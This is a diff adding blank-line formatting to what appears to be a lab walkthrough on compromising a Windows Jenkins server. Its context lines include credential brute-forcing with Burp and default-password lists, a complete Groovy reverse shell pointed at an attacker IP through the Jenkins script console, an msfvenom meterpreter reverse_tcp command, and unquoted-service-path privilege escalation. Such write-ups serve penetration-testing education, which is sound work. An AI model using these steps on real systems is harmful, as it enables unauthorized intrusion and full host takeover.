@@ -136,12 +136,19 @@ Lets try the jenkins_login one first.
 
 We have to set the user list and password list for it to try brute force on. 
 So, we create a user list with the following username: 
+
 •	admin
+
 •	Jenkins
+
 •	root
+
 Then we use the rockyou.txt file to be the password list. Now, this will take a long time due to trying 3 user accounts against over 14 million passwords, so for the sake of time, we will just skip this spart and put the following passwords in a word list called pass.txt
+
 •	password
+
 •	root
+
 •	jenkins
 
 Looks like the login information is jenkins:jenkins
@@ -196,13 +203,21 @@ Just add the names in the payload configuration section
 
 
 Now, doing some OSINT, the top 8 passwords I found for a Jenkins automation server are the following: 
+
 •	admin
+
 •	jenkins
+
 •	root
+
 •	administrator
+
 •	devops
+
 •	cicd
+
 •	system
+
 So just paste those string by string in the add section under payload configuration like we did for the usernames. 
 Once added, everything should look like this: 
 
@@ -213,6 +228,7 @@ Once this has been completed, all we have to do now is click the start attack bu
 <img width="1250" height="673" alt="image" src="https://github.com/user-attachments/assets/58e700b0-bbb2-4120-81a5-f596dad13459" /> 
 
 And now the attack is running. Make a note that this default setup we did would be very noisy to a WAF as this is just sending a TON of POST request to a login page. Plus, the user-agent from Burp suite would be easily picked up on as well since we did not configure it to use a different user agent. 
+
 Moving along, we can see that there are a lot of attempts happening here, but we see all of the number lengths being around 400. However, we see one length that is significantly less than the rest and that is request 6. 
 
 <img width="1250" height="608" alt="image" src="https://github.com/user-attachments/assets/d665e570-6ff5-41fb-bb0a-597507e6fe5c" />
@@ -241,13 +257,17 @@ That worked! We are now in the automation server
 Now that we are in the automation server, we need to click around and look for ways to remain persistent. Can we create an admin account? Can we change the current user's password? 
 
 The section I see is “Manage Jenkins” so let's click on that and see if there is anything of interest here. 
+
 I see a few things of interest in this section now highlighted in red. You should investigate these sections, but for the sake of this walkthrough, we are going to go to the “script console” 
 
 <img width="1250" height="542" alt="image" src="https://github.com/user-attachments/assets/1560e9be-31d0-4d74-bcf7-eb3607e3e3f7" /> 
 
 It looks like this takes a Groovy script to work. Maybe there is a reverse shell for Groovy script, lets search for it on Google. 
+
 Link -> Pure Groovy/Java Reverse Shell · GitHub
+
 Looks like this java script could be promising, so let's try it out
+
 Script — 
 String host=”localhost”;
 int port=8044;
@@ -255,7 +275,9 @@ String cmd=”cmd.exe”;
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 Now, change the string host to your kali box IP and you can keep the port number at 8044, unless you have a service already taking that port up. We don't, so we can keep port 8044 in use. 
+
 So the script will now look like 
+
 String host="192.168.44.128";
 int port=8044;
 String cmd="cmd.exe";
@@ -283,7 +305,7 @@ From here, download the winPEASx64.exe
 Once you download it, you need to transfer it over to the windows machine. 
 On your Kali system, you need to start a python webserver where the winpeas.exe is. Please note, I just changed the name of the .exe to make it easier to type. 
 
-Command for python web server — python3 -m http.server <port number> 
+Command for python web server — python3 -m http.server (port)
 
 <img width="1250" height="198" alt="image" src="https://github.com/user-attachments/assets/c10381a3-9be2-4903-bcb3-625314f68642" />
  
@@ -307,7 +329,9 @@ Net session results look promising:
 <img width="578" height="152" alt="image" src="https://github.com/user-attachments/assets/b45a8558-bedc-49e6-bd32-d7ac42c7389a" />
  
 We also run the commands: 
+
 •	net user %username% 
+
 •	net localgroup Administrators
 
 <img width="1250" height="994" alt="image" src="https://github.com/user-attachments/assets/62ab5163-d2a9-453a-af11-bddd7e10df78" />
@@ -320,10 +344,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT
 <img width="1250" height="225" alt="image" src="https://github.com/user-attachments/assets/f25607c0-6bc2-445d-8d90-cec5cf52b75f" />
  
 We created the file as “wise.exe” because Windows will run through the unquoted service path like this: 
+
 •	C:\Program.exe
+
 •	C:\Program Files.exe
+
 •	C:\Program Files (x86).exe
+
 •	C:\Program Files (x86)\Wise.exe 
+
 This is why we created the payload “wise.exe” because Windows will execute this payload and it should be under as SYSTEM. 
 
 We have transferred over the payload using the certutil command 
